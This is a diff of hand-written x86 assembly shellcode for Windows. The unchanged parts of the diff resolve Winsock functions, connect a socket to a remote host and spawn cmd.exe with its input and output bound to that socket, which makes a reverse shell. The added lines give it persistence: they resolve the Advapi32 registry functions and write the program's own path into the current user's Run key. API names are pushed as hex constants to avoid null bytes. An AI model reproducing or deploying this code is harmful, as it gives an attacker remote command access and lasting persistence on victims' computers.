@@ -3,9 +3,8 @@ Option CaseMap:None
 
 .Code
 start:
-
 	Assume Fs:Nothing
-	Sub Esp, 0B8H
+	Sub Esp, 250H
 	Xor Eax, Eax
 	Mov [Ebp - 4H], Eax			; This will store the number of exported function in kernel32.dll
 	Mov [Ebp - 8H], Eax			; This will store the address of exported table
@@ -17,8 +16,18 @@ start:
 	Mov [Ebp - 20H], Eax			; This will store ws2_32.dll base address
 	Mov [Ebp - 24H], Eax			; This will store WSStartup base address
 	Mov [Ebp - 28H], Eax			; This will store WSASocketA base address
+	Mov [Ebp - 2CH], Eax			; This will store GetModuleFileNameA base address
+	Mov [Ebp - 30H], Eax			; This will store Advapi32.dll base address
+	Mov [Ebp - 34H], Eax			; This will store RegOpenKeyExA base address
+	Mov [Ebp - 38H], Eax			; This will store RegSetValueEx base address
+	Mov [Ebp - 3CH], Eax 			; This will store lstrlenA base address
 	Mov [Ebp - 4AH], Eax			; This will store connect() base address
 	Mov [Ebp - 4EH], Eax			; This will store the address of CreateProcessA
+	Mov [Ebp - 52H], Eax			; This will store RegCloseKey base address
+	Mov [Ebp - 56H], Eax			; This will store registry key handler
+	Mov [Ebp - 150H], Eax			; This will store WSASocketA handle
+	Mov [Ebp - 200H], Eax			; This will save the path of the the current process
+
 
 	Mov Ax, 7373H
 	Push Eax				; Avoid NULL bytes
@@ -119,8 +128,23 @@ getFunctionAddress:
 	Call Edx
 	Mov [Ebp - 4EH], Eax			; Saving CreateProcessA()
 
+	; Load GetModuleFileNameA
+	Add Esp, 8H
+	Mov Edx, [Ebp - 14H]
+	Xor Ecx, Ecx
+	Mov Cx, 4165H
+	Push Ecx
+	Push 6D614E65H
+	Push 6C694665H
+	Push 6C75646FH
+	Push 4D746547H
+	Push Esp				; "GetModuleFileNameA"
+	Push Ebx
+	Call Edx
+	Mov [Ebp - 2CH], Eax			; Saving GetModuleFileNameA base address
+
 	; Load WaitForSingleObject
-	Add Esp, 0CH
+	Add Esp, 14H				; Clear "GetModuleFileNameA" from the stack
 	Mov Edx, [Ebp - 14H]
 	Push 61746365H
 	Sub DWord Ptr [Esp + 3H], 61H
@@ -133,10 +157,22 @@ getFunctionAddress:
 	Call Edx
 	Mov [Ebp - 1CH], Eax			; Saving WaitForSingleObject()
 
+	; Load lstrlenA
+	Add Esp, 14H
+	Mov Edx, [Ebp - 14H]
+	Xor Ecx, Ecx
+	Push Ecx
+	Push 416E656CH
+	Push 7274736CH
+	Push Esp					; "lstrlenA"
+	Push Ebx
+	Call Edx
+	Mov [Ebp - 3CH], Eax
+
 	; The returned data is saved to eax register
 	; Load ws2_32.dll using LoadLibraryA
 	Mov Eax, [Ebp - 18H]
-	Add Esp, 14H				; Clear WaitForSingleObject from the stack
+	Add Esp, 8H				; Clear lstrlenA from the stack
 	Xor Ecx, Ecx
 	Mov Cx, 6C6CH				; ll
 	Push Ecx
@@ -187,6 +223,61 @@ getFunctionAddress:
 	Call Edx				; GetProcAddress
 	Mov [Ebp - 4AH], Eax			; Saving connect() base address
 
+	; Load Advapi32.dll using LoadLibraryA
+	Mov Eax, [Ebp - 18H]
+	Add Esp, 8H					; Clear connect() from the stack
+	Push 6C6C642EH
+	Push 32336970H
+	Push 61766441H
+	Push Esp
+	Call Eax					; Call LoadLibraryA
+	Mov [Ebp - 30H], Eax			; Saving Advapi32.dll base address
+
+	; Get RegOpenKeyExA base address
+	Add Esp, 0CH				
+	Mov Edx, [Ebp - 14H]
+	Mov Eax, [Ebp - 30H]
+	Xor Ecx, Ecx
+	Mov Cl, 41H
+	Push Ecx
+	Push 78457965H
+	Push 4B6E6570H
+	Push 4F676552H
+	Push Esp
+	Push Eax					; Advapi32.dll base address
+	Call Edx					; GetProcAddress
+	Mov [Ebp - 34H], Eax				; Saving RegOpenKeyEx base address
+
+	; Get RegSetValueExA base address
+	Add Esp, 0CH					; Clearing the stack
+	Xor Ecx, Ecx
+	Mov Edx, [Ebp - 14H]
+	Mov Eax, [Ebp - 30H]
+	Mov Cx, 4178H
+	Push Ecx
+	Push 4565756CH
+	Push 61567465H
+	Push 53676552H
+	Push Esp 					; RegSetValueEx
+	Push Eax					; Advapi32.dll base address
+	Call Edx					; GetProcAddress
+	Mov [Ebp - 38H], Eax				; Saving RegSetValueEx base address
+
+	; Get RegCloseKey base address
+	Add Esp, 10H
+	Xor Ecx, Ecx
+	Mov Edx, [Ebp - 14H]
+	Mov Eax, [Ebp - 30H]
+	Mov Ecx, 6179654BH
+	Push Ecx
+	Sub DWord Ptr [Esp + 3H], 61H
+	Push 65736F6CH
+	Push 43676552H
+	Push Esp
+	Push Eax
+	Call Edx
+	Mov [Ebp - 52H], Eax				; Saving RegCloseKey base address
+
 shell:
 	; System call: WSAStartup
 	Xor Edx, Edx
@@ -213,7 +304,8 @@ shell:
 	Push Eax				; af = 2
 	Mov Eax, [Ebp - 28H]
 	Call Eax
-	Mov Ebx, Eax				; WSASocketA() Handler
+	Mov [Ebp - 150H], Eax			; WSASocketA() Handler
+	Mov Ebx, [Ebp - 150H]
 
 	; Sytem call: connect
 	; connect(SOCKET s, const addr *name, int namelen)
@@ -233,12 +325,81 @@ shell:
 	Mov Eax, [Ebp - 4AH]			; connect()
 	Call Eax
 
+	; Retrieve the path of the current process
+	Xor Eax, Eax
+	Xor Ecx, Ecx
+	Mov Ax, 64H
+	Push Eax					; nSize = 100 bytes
+	Lea Eax, [Ebp - 200H]
+	Push Eax					; lpFileName
+	Push Ecx					; hModule = NULL
+	Mov Eax, [Ebp - 2CH]
+	Call Eax					; GetModuleFileNameA
+
+SetRegistryKey:
+	Xor Ecx, Ecx
+	Mov Cl, 6EH
+	Push Ecx
+	Push 75525C6EH
+	Push 6F697372H
+	Push 6556746EH
+	Push 65727275H
+	Push 435C7377H
+	Push 6F646E69H
+	Push 575C7466H
+	Push 6F736F72H
+	Push 63694D5CH
+	Push 65726177H
+	Push 74666F53H
+	Mov Edx, Esp					; edx = Pointer to "Software\Microsoft\Windows\CurrentVersion\Run"
+	Xor Ecx, Ecx
+
+	; Set hKey with RegOpenKeyExA
+	Lea Ebx, [Ebp - 56H]
+	Push Ebx						; phkResult
+	Push 2H							; samDesired = KEY_SET_VALUE
+	Push Ecx						; ulOptions = NULL
+	Push Edx						; lpSubkey
+	Push 80000001H					; hKey = HKEY_CURRENT_USER
+	Mov Eax, [Ebp - 34H]
+	Call Eax						; Call RegOpenKeyEx
+	Add Esp, 48H					; Clearing the stack
+
+	Mov Eax, [Ebp - 3CH]			; Save lstrlenA address to eax
+	Lea Edx, [Ebp - 200H]			; Pointer to buffer that stores exe path
+	Push Edx
+	Call Eax						; Call lstrlenA
+
+	Mov Edi, [Ebp - 56H]			; edi = hKey
+	Xor Ecx, Ecx
+	Push Ecx						; NULL
+	Push 74696873H					; "shit"
+	Mov Ebx, Esp					; ebx = Pointer to "shit" string
+
+	; RegSetValueExA
+	Lea Edx, [Ebp - 200H]			; Pointer to buffer that stores exe path
+	Push Eax						; cbData
+	Push Edx						; lpData = pointer to the path of the exe
+	Inc Ecx
+	Push Ecx						; dwType = REG_SZ
+	Dec Ecx
+	Push Ecx						; Reserved
+	Push Ebx						; lpValueName
+	Push Edi						; hKey
+	Mov Eax, [Ebp - 38H]
+	Call Eax						; Call RegSetValueExA
+
+	Push Edi
+	Mov Eax, [Ebp - 52H]			; Move RegCloseKey address to eax
+	Call Eax						; Call RegCloseKey
+
 	; CreateProcessA
 	Push 61646D63H						; "acmd"
 	Sub DWord Ptr [Esp + 3H], 61H				; Remove "a"
 	Mov Edx, Esp						; edx = pointer to "cmd" string
 
 	; STARTUPINFO struct
+	Mov Ebx, [Ebp - 150H]
 	Push Ebx						; SetStdInput to WSASocketA() handler
 	Push Ebx						; SetStdOutput to WSASocketA() handler
 	Push Ebx						; SetStdError to WSASocketA() handler
